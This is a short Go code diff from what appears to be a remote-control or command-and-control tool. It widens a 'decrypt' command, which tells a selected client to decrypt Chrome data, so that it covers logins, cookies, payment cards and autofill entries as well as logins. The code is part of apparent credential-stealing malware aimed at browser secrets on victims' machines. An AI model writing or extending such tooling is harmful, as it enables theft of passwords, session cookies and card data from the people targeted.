@@ -167,7 +167,7 @@ func RegisterCommands() {
 		CallClear()
 		return nil
 	})
-	RegisterCommand("decrypt", "Decrypt chrome data", []string{"login"}, true, func(args []string) error {
+	RegisterCommand("decrypt", "Decrypt chrome data", []string{"login, cookies, cards, autofill"}, true, func(args []string) error {
 		selectedClient.SendData("decrypt " + args[0])
 		return nil
 	})
